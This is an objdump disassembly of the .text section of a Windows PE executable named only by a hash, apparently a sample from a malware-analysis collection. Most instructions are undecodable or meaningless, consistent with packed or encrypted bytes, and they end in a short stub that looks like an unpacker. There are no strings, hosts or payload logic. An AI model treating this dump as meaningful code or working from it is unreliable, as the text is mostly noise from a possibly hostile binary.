
87870c0850121459c9bf05279db89685b7eee86ba67ed0a15cdae44885186084.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	cwde   
  4d0001:	(bad)  
  4d0002:	lock mov edx,DWORD PTR [esi+0x7c]
  4d0006:	or     al,0xee
  4d0008:	pop    ds
  4d0009:	fld    st(1)
  4d000b:	arpl   dx,di
  4d000d:	mov    bh,ch
  4d000f:	inc    ebx
  4d0010:	push   cs
  4d0011:	push   es
  4d0012:	pop    ecx
  4d0013:	push   0x2f57639
  4d0018:	sbb    dl,ah
  4d001a:	call   0xf033:0xe8e7148d
  4d0021:	ins    DWORD PTR es:[edi],dx
  4d0022:	jne    0x4cffd2
  4d0024:	push   cs
  4d0025:	push   ss
  4d0026:	dec    edi
  4d0027:	inc    esi
  4d0028:	fcomi  st,st(7)
  4d002a:	mov    al,0xb9
  4d002c:	mov    BYTE PTR es:[ecx-0x1d223ba9],cl
  4d0033:	fld    TBYTE PTR [edi+0x50]
  4d0036:	adc    DWORD PTR [eax-0x40295002],0x6af45084
  4d0040:	fidiv  WORD PTR [ebx+ecx*1]
  4d0043:	ins    BYTE PTR es:[edi],dx
  4d0044:	scas   al,BYTE PTR es:[edi]
  4d0045:	mov    ds:0xdd8fd6f8,eax
  4d004a:	jg     0x4d00c5
  4d004c:	jb     0x4cfff0
  4d004e:	test   BYTE PTR [esi+0x6c638905],al
  4d0054:	add    DWORD PTR [edi-0x64],esi
  4d0057:	lock mov edi,DWORD PTR [esi+0x1d]
  4d005b:	and    BYTE PTR [esi-0x7f],dh
  4d005e:	loop   0x4cffec
  4d0060:	jae    0x4d00d3
  4d0062:	and    BYTE PTR [ebx-0x72],dh
  4d0065:	pop    ss
  4d0066:	mov    DWORD PTR es:[ebp-0x22],edx
  4d006a:	inc    esp
  4d006b:	ficom  DWORD PTR [ebx+eiz*2]
  4d006e:	daa    
  4d006f:	xchg   edx,eax
  4d0070:	pop    esp
  4d0071:	add    eax,0x6b06d321
  4d0076:	xor    eax,DWORD PTR [eax+0x8d4eafa]
  4d007c:	or     eax,0x3a5f2b7f
  4d0081:	repz cmp DWORD PTR [esi],eax
  4d0084:	das    
  4d0085:	push   ebp
  4d0086:	sub    ebx,DWORD PTR [ebx+0x42]
  4d0089:	jmp    DWORD PTR [edi]
  4d008b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d008c:	adc    al,0x9
  4d008e:	popa   
  4d008f:	mov    ds:0x766379f1,al
  4d0094:	jp     0x4d005c
  4d0096:	add    al,0x8a
  4d0098:	xchg   edi,eax
  4d0099:	cmp    ebx,edi
  4d009b:	fisttp QWORD PTR [esi]
  4d009d:	int    0x4
  4d009f:	and    bl,BYTE PTR [ebp+0x33]
  4d00a2:	cli    
  4d00a3:	xor    esi,DWORD PTR [edi+edx*2-0x57132e02]
  4d00aa:	add    DWORD PTR [esi],ebp
  4d00ac:	gs in  al,0xb3
  4d00af:	mov    ds:0x174c1b95,al
  4d00b4:	adc    bl,ch
  4d00b6:	mov    bl,0xe8
  4d00b8:	in     al,0xb9
  4d00ba:	verr   WORD PTR [esi-0x47000fb5]
  4d00c1:	adc    dl,BYTE PTR [edi+0x51436d34]
  4d00c7:	lds    ebx,FWORD PTR [eax-0x5fdd5144]
  4d00cd:	dec    eax
  4d00ce:	push   ecx
  4d00cf:	fucomp st(4)
  4d00d1:	scas   eax,DWORD PTR es:[edi]
  4d00d2:	sbb    DWORD PTR [ebx],esp
  4d00d4:	jg     0x4d0126
  4d00d6:	in     eax,0x52
  4d00d8:	out    0x6,al
  4d00da:	sbb    al,BYTE PTR [ebx]
  4d00dc:	inc    ebx
  4d00dd:	test   BYTE PTR [ebx],dh
  4d00df:	sub    BYTE PTR gs:[eax+eiz*1-0xd],bh
  4d00e4:	fdivr  DWORD PTR [eax-0x6285a2fd]
  4d00ea:	push   ebx
  4d00eb:	mov    ds:0xb5048edc,al
  4d00f0:	and    al,0xc7
  4d00f2:	adc    esi,DWORD PTR [ebx]
  4d00f4:	push   es
  4d00f5:	cmp    al,0xec
  4d00f7:	int3   
  4d00f8:	xchg   BYTE PTR [edx],cl
  4d00fa:	push   eax
  4d00fb:	sar    BYTE PTR [edi-0x5],0x15
  4d00ff:	aaa    
  4d0100:	ret    0xea1a
  4d0103:	call   0x6f9bfcbc
  4d0108:	cmp    DWORD PTR [eax-0x3e],0xa7bbd81b
  4d010f:	call   0x17d545a5
  4d0114:	jo     0x4d00d0
  4d0116:	call   0x6d91e553
  4d011b:	xlat   BYTE PTR ds:[ebx]
  4d011c:	test   al,0x38
  4d011e:	(bad)  
  4d011f:	js     0x4d00ce
  4d0121:	xor    DWORD PTR ds:0x50cda7de,eax
  4d0127:	cs scas al,BYTE PTR es:[edi]
  4d0129:	pushf  
  4d012a:	mov    cl,0x28
  4d012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d012d:	mov    ecx,0x41e6a6d9
  4d0132:	sbb    bh,dh
  4d0134:	jns    0x4d00f3
  4d0136:	cmp    ecx,DWORD PTR [esi]
  4d0138:	loopne 0x4d0107
  4d013a:	xchg   edx,eax
  4d013b:	cmc    
  4d013c:	push   0x6e
  4d013e:	cli    
  4d013f:	sub    DWORD PTR [edi+0x619c5d1c],0xffffff9a
  4d0146:	in     al,0x77
  4d0148:	mov    ds:0xa73f2b5d,eax
  4d014d:	test   al,0x34
  4d014f:	dec    esp
  4d0150:	mov    eax,ds:0xd474506b
  4d0155:	aad    0x3a
  4d0157:	shl    DWORD PTR ds:0x6a185af,cl
  4d015d:	cmp    DWORD PTR [ebx+eiz*2],ecx
  4d0160:	sti    
  4d0161:	(bad)  
  4d0162:	jle    0x4d01c9
  4d0164:	xchg   ecx,eax
  4d0165:	and    BYTE PTR [ebp+0x5a81e582],0x7d
  4d016c:	pop    ds
  4d016d:	cmc    
  4d016e:	mov    ecx,0xd11b5981
  4d0173:	std    
  4d0174:	mov    ah,0xe7
  4d0176:	sub    DWORD PTR [esi-0x63],ebx
  4d0179:	mov    ds:0xadb4f4aa,eax
  4d017e:	lods   al,BYTE PTR ds:[esi]
  4d017f:	pop    esp
  4d0180:	lahf   
  4d0181:	mov    esp,0x42b9f457
  4d0186:	(bad)  
  4d0187:	pop    ss
  4d0188:	mov    eax,ds:0x533fc1f0
  4d018d:	mov    edx,0x39794b9d
  4d0192:	pop    es
  4d0193:	mov    ah,0xdd
  4d0195:	rcl    BYTE PTR [eax-0x53],cl
  4d0198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d0199:	hlt    
  4d019a:	xlat   BYTE PTR ds:[ebx]
  4d019b:	xor    al,0xb
  4d019d:	hlt    
  4d019e:	xor    ecx,esp
  4d01a0:	test   BYTE PTR [ebx],0xb4
  4d01a3:	mov    ch,0xb
  4d01a5:	hlt    
  4d01a6:	dec    ebx
  4d01a7:	mov    ds:0x5df40c5e,al
  4d01ac:	mov    ds:0xb40a81f2,eax
  4d01b1:	cwde   
  4d01b2:	jns    0x4d0135
  4d01b4:	cmp    eax,0xc4829150
  4d01b9:	scas   eax,DWORD PTR es:[edi]
  4d01ba:	sar    BYTE PTR [edx+esi*2-0x80],cl
  4d01be:	sub    eax,0x5dd78f83
  4d01c3:	mov    ebp,0x4ee2b37e
  4d01c8:	mov    esp,0x492535a4
  4d01cd:	out    0xca,al
  4d01cf:	lds    ebp,FWORD PTR [edi+0x555e41a5]
  4d01d5:	mov    ds:0x851d2cfa,eax
  4d01da:	or     dl,cl
  4d01dc:	ins    DWORD PTR es:[edi],dx
  4d01dd:	repz movsx eax,WORD PTR [ecx+ebp*1]
  4d01e2:	push   esi
  4d01e3:	cmp    BYTE PTR [esi],bh
  4d01e5:	in     eax,dx
  4d01e6:	test   eax,0xba1f38e7
  4d01eb:	mov    ecx,0x4645e0e1
  4d01f0:	stos   DWORD PTR es:[edi],eax
  4d01f1:	pop    edi
  4d01f2:	jmp    0x4713:0x14a8ce42
  4d01f9:	aas    
  4d01fa:	(bad)  
  4d01fb:	out    dx,eax
  4d01fc:	mov    edx,0x9fd9fac0
  4d0201:	enter  0x4a79,0x7e
  4d0205:	cwde   
  4d0206:	(bad)  
  4d0207:	popf   
  4d0208:	shr    BYTE PTR [ebx+0x29],0x62
  4d020c:	cdq    
  4d020d:	adc    eax,0xec68f64f
  4d0212:	mov    al,0x9
  4d0214:	push   cs
  4d0215:	and    ebx,edx
  4d0217:	cli    
  4d0218:	pop    ss
  4d0219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d021a:	sub    ch,BYTE PTR [ecx]
  4d021c:	jmp    0x4f19:0x16d6d55b
  4d0223:	sub    eax,0x96711a3b
  4d0228:	es jno 0x4d01ad
  4d022b:	ins    DWORD PTR es:[edi],dx
  4d022c:	push   ecx
  4d022d:	retf   
  4d022e:	or     BYTE PTR [ecx+0x30],cl
  4d0231:	xor    eax,0xc156b6f7
  4d0236:	jge    0x4d01f4
  4d0238:	scas   al,BYTE PTR es:[edi]
  4d0239:	xor    DWORD PTR [esi],ecx
  4d023b:	ret    0x535f
  4d023e:	icebp  
  4d023f:	mov    dl,0xc
  4d0241:	mov    al,0x9
  4d0243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0244:	hlt    
  4d0245:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0246:	cli    
  4d0247:	(bad)  
  4d0249:	iret   
  4d024a:	or     DWORD PTR [edi+0x33],esi
  4d024d:	xchg   dh,dh
  4d024f:	fsub   DWORD PTR [eax*1-0x121fc880]
  4d0256:	or     eax,edi
  4d0258:	into   
  4d0259:	xchg   edi,eax
  4d025a:	mov    ah,0xae
  4d025c:	cs xchg esp,eax
  4d025e:	inc    edx
  4d025f:	frstor [ecx-0x4b8cf136]
  4d0265:	lahf   
  4d0266:	cmc    
  4d0267:	frstor [edi+ebx*2+0x2bb32e60]
  4d026e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d026f:	push   esi
  4d0270:	push   cs
  4d0271:	gs jmp 0xcbff:0xa2ab3934
  4d0279:	stos   DWORD PTR es:[edi],eax
  4d027a:	or     al,BYTE PTR [esi+0x2310c8f6]
  4d0280:	or     esi,DWORD PTR [edi]
  4d0282:	out    dx,eax
  4d0283:	pop    esp
  4d0284:	imul   ecx,ebp,0xffffff9d
  4d0287:	out    0x99,eax
  4d0289:	xor    al,0x87
  4d028b:	pop    ss
  4d028c:	addr16 retf 
  4d028e:	clc    
  4d028f:	cmp    BYTE PTR [ecx+0x67db2ba9],bl
  4d0295:	lods   al,BYTE PTR ds:[esi]
  4d0296:	fmul   st(7),st
  4d0298:	test   DWORD PTR [ebx+eax*4],esi
  4d029b:	mov    ss,esp
  4d029d:	and    al,0xd1
  4d029f:	sar    DWORD PTR [esi+0x32],0x2e
  4d02a3:	xchg   esp,eax
  4d02a4:	(bad)  
  4d02a5:	and    eax,0xc5863255
  4d02aa:	cmp    ch,BYTE PTR [edi]
  4d02ac:	ds fwait
  4d02ae:	push   eax
  4d02af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02b0:	dec    esi
  4d02b1:	push   edi
  4d02b2:	mov    bl,0xd1
  4d02b4:	out    dx,eax
  4d02b5:	shl    DWORD PTR [edx+0x6cfe9762],cl
  4d02bb:	and    edi,edi
  4d02bd:	add    DWORD PTR [ebx+0x118c8dde],edx
  4d02c3:	and    dh,BYTE PTR [ebx+esi*2+0x79]
  4d02c7:	xchg   esp,eax
  4d02c8:	sub    eax,0x596b868d
  4d02cd:	imul   ecx,DWORD PTR [ecx+0x76972918],0x375bdbe7
  4d02d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02d8:	push   ds
  4d02d9:	test   al,0xc3
  4d02db:	lods   al,BYTE PTR ds:[esi]
  4d02dc:	outs   dx,BYTE PTR ds:[esi]
  4d02dd:	sbb    al,0x8d
  4d02df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d02e0:	in     eax,0x33
  4d02e2:	fstp   QWORD PTR [edi-0x7c]
  4d02e5:	int3   
  4d02e6:	xor    ah,BYTE PTR [eax+0x48508a7d]
  4d02ec:	mov    ch,al
  4d02ee:	sbb    DWORD PTR [ecx+eiz*8+0x2043f63a],edi
  4d02f5:	sbb    al,0x8b
  4d02f7:	rol    BYTE PTR ds:0xfc3f84e4,0x1a
  4d02fe:	ror    esp,1
  4d0300:	add    al,0x3b
  4d0302:	cmp    ecx,DWORD PTR [ebp+0x3af07256]
  4d0308:	cld    
  4d0309:	sbb    al,bl
  4d030b:	xchg   esi,eax
  4d030c:	out    dx,al
  4d030d:	push   0x11
  4d030f:	outs   dx,BYTE PTR ds:[esi]
  4d0310:	inc    esi
  4d0311:	push   ebp
  4d0312:	push   ebp
  4d0313:	aas    
  4d0314:	and    DWORD PTR [ebx+ebp*4-0x10],edx
  4d0318:	push   esp
  4d0319:	mov    ah,0x79
  4d031b:	push   cs
  4d031c:	mov    esp,0x59f2864b
  4d0321:	mov    ebx,0xd201fc5b
  4d0326:	call   0x69cc0752
  4d032b:	sub    ah,bh
  4d032d:	mov    cl,0xfe
  4d032f:	xlat   BYTE PTR ds:[ebx]
  4d0330:	adc    eax,0x6f7f014e
  4d0335:	call   0x2f64:0x9691d103
  4d033c:	sub    BYTE PTR [ecx-0x65],0x27
  4d0340:	add    bl,BYTE PTR [ebx+0x650fd888]
  4d0346:	ja     0x4d036e
  4d0348:	inc    edi
  4d0349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d034a:	xchg   DWORD PTR [edi],ebp
  4d034c:	(bad)  
  4d034d:	mov    dl,0xd1
  4d034f:	sub    BYTE PTR [ebx-0x10b3082e],dl
  4d0355:	mov    cs,ebx
  4d0357:	adc    edi,ebp
  4d0359:	js     0x4d033c
  4d035b:	into   
  4d035c:	add    DWORD PTR ds:0x76c33453,edx
  4d0362:	xchg   ebp,eax
  4d0363:	push   edi
  4d0364:	xor    DWORD PTR [ebx+0x7b],eax
  4d0367:	test   al,0xd0
  4d0369:	mov    esp,0x4330436c
  4d036e:	xchg   ebx,eax
  4d036f:	jbe    0x4d0361
  4d0371:	mov    esp,0x24f9896c
  4d0376:	xchg   ebx,eax
  4d0377:	jbe    0x4d0380
  4d0379:	xor    ah,BYTE PTR [esi]
  4d037b:	xchg   ecx,eax
  4d037c:	cli    
  4d037d:	int    0xd9
  4d037f:	push   esi
  4d0380:	fnsave [ecx]
  4d0382:	es test eax,0x8b659eaf
  4d0388:	jbe    0x4d03a4
  4d038a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d038b:	je     0x4d0318
  4d038d:	in     eax,0x43
  4d038f:	push   ebx
  4d0390:	jne    0x4d03ac
  4d0392:	mov    esp,0xe718a38
  4d0397:	mov    al,0x35
  4d0399:	mov    ?,ecx
  4d039b:	dec    edi
  4d039c:	push   DWORD PTR [ecx]
  4d039e:	pop    edi
  4d039f:	jno    0x4d036b
  4d03a1:	aad    0x61
  4d03a3:	xchg   ebx,eax
  4d03a4:	pop    ebx
  4d03a5:	aaa    
  4d03a6:	lahf   
  4d03a7:	jo     0x4d0373
  4d03a9:	je     0x4d0390
  4d03ab:	dec    edi
  4d03ac:	lods   al,BYTE PTR ds:[esi]
  4d03ad:	jl     0x4d0422
  4d03af:	cmp    ecx,DWORD PTR [edi+edi*4+0x51]
  4d03b3:	cmp    DWORD PTR [eax-0x2b5bdc76],edi
  4d03b9:	test   eax,0x56371500
  4d03be:	(bad)  
  4d03bf:	jmp    0xd04e:0x15003fb2
  4d03c6:	mov    dh,0xf7
  4d03c8:	or     DWORD PTR [esi+0x7200c19a],ecx
  4d03ce:	gs ds jmp 0x180e9de8
  4d03d5:	inc    esi
  4d03d6:	dec    esi
  4d03d7:	mov    esi,0xcbb1b9e9
  4d03dc:	mov    WORD PTR [edx+0x6a],gs
  4d03df:	xchg   ebp,eax
  4d03e0:	cmp    bh,ah
  4d03e2:	push   esi
  4d03e3:	push   ebx
  4d03e4:	out    0xd1,al
  4d03e6:	leave  
  4d03e7:	lods   al,BYTE PTR ds:[esi]
  4d03e8:	sbb    ebp,DWORD PTR [esi]
  4d03ea:	jle    0x4d03b3
  4d03ec:	push   ss
  4d03ed:	mov    eax,DWORD PTR [eax+edi*1+0x3bc374eb]
  4d03f4:	ds inc esp
  4d03f6:	pop    ebp
  4d03f7:	(bad)
  4d03fb:	scas   eax,DWORD PTR es:[edi]
  4d03fc:	pop    esi
  4d03fd:	std    
  4d03fe:	sbb    DWORD PTR [eax-0x5d],edx
  4d0401:	add    ch,BYTE PTR [esi]
  4d0403:	and    al,0x76
  4d0405:	mov    dh,0x12
  4d0407:	fmul   QWORD PTR [ebx-0x7967cab7]
  4d040d:	outs   dx,DWORD PTR ds:[esi]
  4d040e:	iret   
  4d040f:	addr16 jnp 0x4d03a2
  4d0412:	js     0x4d0420
  4d0414:	mov    gs,WORD PTR [eax]
  4d0416:	enter  0x73f3,0xd7
  4d041a:	jg     0x4d039c
  4d041c:	mov    ?,WORD PTR [ebx-0x52c926bf]
  4d0422:	dec    ecx
  4d0423:	jl     0x4d0460
  4d0425:	aam    0xa8
  4d0427:	adc    eax,0x75cf71b0
  4d042c:	sahf   
  4d042d:	idiv   BYTE PTR [ebx-0x63791978]
  4d0433:	ja     0x4d03c4
  4d0435:	jl     0x4d049b
  4d0437:	std    
  4d0438:	retf   0xe10e
  4d043b:	bound  edi,QWORD PTR [ecx+esi*4-0x6b314d6d]
  4d0442:	test   al,0x9f
  4d0444:	in     eax,dx
  4d0445:	outs   dx,DWORD PTR ds:[esi]
  4d0446:	push   edi
  4d0447:	pusha  
  4d0448:	adc    al,0x78
  4d044a:	dec    esi
  4d044b:	mov    eax,ds:0x620b87ed
  4d0450:	add    al,0x7c
  4d0452:	in     al,dx
  4d0453:	leave  
  4d0454:	lds    edi,FWORD PTR [edi+0x4db18e88]
  4d045a:	jp     0x4d0442
  4d045c:	lods   al,BYTE PTR ds:[esi]
  4d045d:	mov    ch,0x2
  4d045f:	jbe    0x4d03e1
  4d0461:	xchg   edi,eax
  4d0462:	pop    ecx
  4d0463:	cmovp  ebx,ebp
  4d0466:	mov    cl,0x9d
  4d0468:	pop    es
  4d0469:	push   esi
  4d046a:	adc    BYTE PTR [ebp+0x46d92da5],bh
  4d0470:	ds mov dh,0x88
  4d0473:	jl     0x4d0498
  4d0475:	int    0xf4
  4d0477:	iret   
  4d0478:	fisub  WORD PTR [esi+0x5932181d]
  4d047e:	loop   0x4d0467
  4d0480:	pop    edx
  4d0481:	and    al,0x72
  4d0483:	popf   
  4d0484:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0485:	push   eax
  4d0486:	xchg   esp,eax
  4d0487:	or     eax,0xf26c5343
  4d048c:	mov    esi,0x426e570d
  4d0491:	dec    eax
  4d0492:	in     eax,0x1c
  4d0494:	xchg   edi,eax
  4d0495:	inc    ebx
  4d0496:	nop
  4d0497:	das    
  4d0498:	cmc    
  4d0499:	add    eax,eax
  4d049b:	and    BYTE PTR [esi+eiz*2+0x40],bl
  4d049f:	fbstp  TBYTE PTR [ecx-0x5adfed67]
  4d04a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d04a6:	inc    esi
  4d04a7:	xor    bh,ah
  4d04a9:	push   ecx
  4d04aa:	lods   eax,DWORD PTR ds:[esi]
  4d04ab:	je     0x4d04af
  4d04ad:	out    0x52,eax
  4d04af:	mov    edi,edi
  4d04b1:	pusha  
  4d04b2:	ss mov ecx,0x3f54bf26
  4d04b8:	push   0x99c5684d
  4d04bd:	mov    dl,0x97
  4d04bf:	sahf   
  4d04c0:	or     DWORD PTR [esi+0x68],esp
  4d04c3:	popa   
  4d04c4:	clc    
  4d04c5:	and    al,0x8
  4d04c7:	retf   
  4d04c8:	pop    edx
  4d04c9:	inc    ebx
  4d04ca:	clc    
  4d04cb:	xor    al,0xb3
  4d04cd:	mov    esp,0x83a3ca5a
  4d04d2:	xor    al,BYTE PTR [edx+0x16]
  4d04d5:	or     al,0xcf
  4d04d7:	or     eax,0xeabcc376
  4d04dc:	jle    0x4d04c0
  4d04de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04df:	mov    dh,0x9b
  4d04e1:	sbb    eax,0x22f54958
  4d04e6:	aam    0x17
  4d04e8:	iret   
  4d04e9:	cmp    eax,0xc452d4ad
  4d04ee:	push   edx
  4d04ef:	sub    edx,DWORD PTR [edi]
  4d04f1:	pusha  
  4d04f2:	scas   eax,DWORD PTR es:[edi]
  4d04f3:	aam    0xea
  4d04f5:	rol    BYTE PTR [esi-0x6a],cl
  4d04f8:	pop    ss
  4d04f9:	xchg   edi,eax
  4d04fa:	shr    DWORD PTR [eax+0x3f],0x85
  4d04fe:	leave  
  4d04ff:	outs   dx,DWORD PTR ds:[esi]
  4d0500:	push   ss
  4d0501:	into   
  4d0502:	xor    eax,0xebd1fe6
  4d0507:	inc    BYTE PTR ds:[ebp+0x31]
  4d050b:	dec    BYTE PTR [esi+0x73028f3a]
  4d0511:	(bad)
  4d0514:	add    bh,BYTE PTR [eax+edx*2]
  4d0517:	xchg   esi,eax
  4d0518:	push   edx
  4d0519:	ret    
  4d051a:	add    eax,0x6ffd34a2
  4d051f:	inc    ebx
  4d0520:	and    BYTE PTR [edx],al
  4d0522:	out    0xd4,al
  4d0524:	(bad)
  4d0529:	cmp    eax,0xde86474a
  4d052e:	push   ss
  4d052f:	jl     0x4d050c
  4d0531:	mov    DWORD PTR [ebp-0x10],edx
  4d0534:	es jbe 0x4d0549
  4d0537:	or     BYTE PTR [edi-0x48],0x51
  4d053b:	out    0x1f,al
  4d053d:	mov    ebx,0x44367d24
  4d0542:	xor    DWORD PTR [edi-0x7ebb83b0],eax
  4d0548:	add    eax,0x817f1183
  4d054d:	cmp    eax,0xc2eace63
  4d0552:	add    al,0x9b
  4d0554:	test   DWORD PTR [ecx-0x3a1d329f],esi
  4d055a:	push   cs
  4d055b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d055c:	jae    0x4d04e8
  4d055e:	lock mov al,0x96
  4d0561:	clc    
  4d0562:	rcr    DWORD PTR [ebx-0xa],cl
  4d0565:	idiv   DWORD PTR [eax+edi*8+0x75]
  4d0569:	dec    eax
  4d056a:	in     eax,dx
  4d056b:	push   cs
  4d056c:	loop   0x4d0524
  4d056e:	push   0xeb9977fd
  4d0573:	push   edx
  4d0574:	hlt    
  4d0575:	ins    DWORD PTR es:[edi],dx
  4d0576:	push   0xffffff95
  4d0578:	xor    edx,DWORD PTR [edx-0x55a6956b]
  4d057e:	mov    ss,WORD PTR [esi]
  4d0580:	outs   dx,DWORD PTR ds:[esi]
  4d0581:	push   0x192e971
  4d0586:	xchg   esi,eax
  4d0587:	outs   dx,DWORD PTR ds:[esi]
  4d0588:	bound  esp,QWORD PTR [ebx+0x8651bb1]
  4d058e:	fsub   QWORD PTR [edx-0x6b]
  4d0591:	test   al,0x8c
  4d0593:	inc    edi
  4d0594:	les    eax,FWORD PTR [edx]
  4d0596:	and    al,0x7c
  4d0598:	out    0xfc,eax
  4d059a:	xor    DWORD PTR [eax+0x7c928672],edx
  4d05a0:	lock cmp al,0xc6
  4d05a3:	and    cl,0x18
  4d05a6:	and    bl,BYTE PTR [eax+eiz*1]
  4d05a9:	out    0xdd,eax
  4d05ab:	inc    eax
  4d05ac:	outs   dx,BYTE PTR ds:[esi]
  4d05ad:	pop    esi
  4d05ae:	xchg   edx,eax
  4d05af:	inc    edx
  4d05b0:	push   ebx
  4d05b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d05b2:	test   BYTE PTR [ecx],0xd2
  4d05b5:	imul   esp,DWORD PTR [esi-0x2],0x199962f
  4d05bc:	shr    BYTE PTR [ecx-0x32],cl
  4d05bf:	(bad)  
  4d05c0:	das    
  4d05c1:	xchg   esi,eax
  4d05c2:	xor    esp,eax
  4d05c4:	cmp    BYTE PTR [ebp-0x4f7c5d3c],bl
  4d05ca:	xchg   ebp,eax
  4d05cb:	ret    
  4d05cc:	sub    esi,DWORD PTR [esi+0x524a0c9d]
  4d05d2:	jecxz  0x4d05b5
  4d05d4:	mov    ecx,0x331e1cbd
  4d05d9:	xor    BYTE PTR [ecx+0x40],dh
  4d05dc:	int3   
  4d05dd:	push   esp
  4d05de:	mov    ?,WORD PTR ds:0x4e83726
  4d05e4:	inc    ecx
  4d05e5:	sub    DWORD PTR [eax+0x40],0x4d
  4d05e9:	mov    cl,0xb5
  4d05eb:	and    eax,0xaa7db561
  4d05f0:	adc    eax,0x1fa7462b
  4d05f5:	sahf   
  4d05f6:	sti    
  4d05f7:	and    DWORD PTR [edx+ebx*8+0x105ff008],0xffffffef
  4d05ff:	inc    ebx
  4d0600:	(bad)  
  4d0602:	rcr    BYTE PTR [esi-0x130f9965],cl
  4d0608:	jecxz  0x4d060b
  4d060a:	jp     0x4d0623
  4d060c:	xchg   dh,bh
  4d060e:	xchg   ebp,eax
  4d060f:	call   0x18215e8f
  4d0614:	test   ebp,edi
  4d0616:	cmp    esi,DWORD PTR [ebx+0x6c]
  4d0619:	test   BYTE PTR [eax+0x4f7b9691],dh
  4d061f:	stc    
  4d0620:	addr16 in eax,dx
  4d0622:	mov    ah,0x7
  4d0624:	call   0x7e43:0x664ba212
  4d062b:	push   ds
  4d062c:	fwait
  4d062d:	and    al,0x2
  4d062f:	loop   0x4d0697
  4d0631:	(bad)  [edi+0x21]
  4d0634:	add    eax,0x64e00225
  4d0639:	(bad)  
  4d063b:	pop    ds
  4d063c:	sbb    eax,0x836017c
  4d0641:	add    eax,0xfafacec3
  4d0646:	cmp    al,0xf4
  4d0648:	xchg   edi,eax
  4d0649:	pop    ebp
  4d064a:	ret    0x65dc
  4d064d:	ja     0x4d062f
  4d064f:	test   BYTE PTR [esi],ah
  4d0651:	lds    esp,FWORD PTR [ebx]
  4d0653:	enter  0xf328,0x8b
  4d0657:	add    al,0xb6
  4d0659:	dec    eax
  4d065a:	or     eax,0x3b436b82
  4d065f:	loopne 0x4d06d8
  4d0661:	das    
  4d0662:	sahf   
  4d0663:	cmp    ebp,DWORD PTR [edx-0x73]
  4d0666:	inc    eax
  4d0667:	xor    DWORD PTR [edx],esi
  4d0669:	and    DWORD PTR [ebx+eiz*4-0x71],ebx
  4d066d:	add    ch,ch
  4d066f:	clc    
  4d0670:	dec    edx
  4d0671:	imul   eax,eax,0x1e
  4d0674:	mov    ch,0x5e
  4d0676:	jmp    0x77c2:0xb00d9266
  4d067d:	jne    0x4d06da
  4d067f:	in     al,0x43
  4d0681:	jno    0x4d063e
  4d0683:	sbb    al,0xfe
  4d0685:	stos   BYTE PTR es:[edi],al
  4d0686:	inc    ebp
  4d0687:	outs   dx,BYTE PTR ds:[esi]
  4d0688:	mov    esi,0xd0599c9d
  4d068d:	and    eax,eax
  4d068f:	int3   
  4d0690:	xor    esi,DWORD PTR [ecx+0x7f]
  4d0693:	jmp    0x7133:0x15808ece
  4d069a:	jg     0x4d0686
  4d069c:	into   
  4d069d:	mov    es,WORD PTR [eax+0x7f713315]
  4d06a3:	jmp    0x7133:0x15808ece
  4d06aa:	jg     0x4d0696
  4d06ac:	into   
  4d06ad:	mov    es,WORD PTR [eax+0x7fd23315]
  4d06b3:	jmp    0x7e33:0x158585ce
  4d06ba:	jp     0x4d06a6
  4d06bc:	push   edi
  4d06bd:	mov    ah,BYTE PTR [ebx+ecx*1+0x56]
  4d06c1:	jmp    0x34d0b26d
  4d06c6:	xor    al,0x4b
  4d06c8:	imul   edx,DWORD PTR [ebx-0x29],0xffffffcb
  4d06cc:	sbb    eax,0xbba9be15
  4d06d1:	(bad)  
  4d06d2:	cmp    al,0x66
  4d06d4:	mov    eax,0xe9bc77a8
  4d06d9:	xlat   BYTE PTR ds:[ebx]
  4d06da:	fimul  WORD PTR [ecx+eax*1-0x32]
  4d06de:	mov    WORD PTR [ebx+0x6ff85a09],?
  4d06e4:	push   ecx
  4d06e5:	mov    edx,0x265e6532
  4d06ea:	cld    
  4d06eb:	test   eax,0x8b55ff8b
  4d06f0:	in     al,dx
  4d06f1:	sub    esp,0x30
  4d06f4:	mov    ecx,0x4d314c
  4d06f9:	and    eax,edi
  4d06fb:	push   ecx
  4d06fc:	push   ebx
  4d06fd:	push   edi
  4d06fe:	push   edx
  4d06ff:	push   eax
  4d0700:	call   0x4d0a44
  4d0705:	add    esp,0x10
  4d0708:	pop    ecx
  4d0709:	push   ecx
  4d070a:	mov    ecx,0x0
  4d070f:	push   ecx
  4d0710:	call   0x4d1174
  4d0715:	add    esp,0x4
  4d0718:	pop    ecx
  4d0719:	push   ecx
  4d071a:	call   0x4d0bd0
  4d071f:	add    esp,0x4
  4d0722:	pop    ecx
  4d0723:	add    esp,0x30
  4d0726:	pop    ebp
  4d0727:	ret    
  4d0728:	mov    edi,edi
  4d072a:	push   ebp
  4d072b:	mov    ebp,esp
  4d072d:	sub    esp,0x58
  4d0730:	lea    edx,ds:0x4d3114
  4d0736:	sub    edi,0x18f3
  4d073c:	push   edx
  4d073d:	push   ebx
  4d073e:	push   DWORD PTR [edx+0x74]
  4d0741:	push   DWORD PTR [edx+0x118]
  4d0747:	push   DWORD PTR [edx+0x78]
  4d074a:	call   0x4d1524
  4d074f:	add    esp,0x10
  4d0752:	pop    edx
  4d0753:	push   edx
  4d0754:	call   0x4d0bd0
  4d0759:	add    esp,0x4
  4d075c:	pop    edx
  4d075d:	push   edx
  4d075e:	lea    eax,[edx-0x114]
  4d0764:	push   eax
  4d0765:	call   0x4d1254
  4d076a:	add    esp,0x4
  4d076d:	test   eax,eax
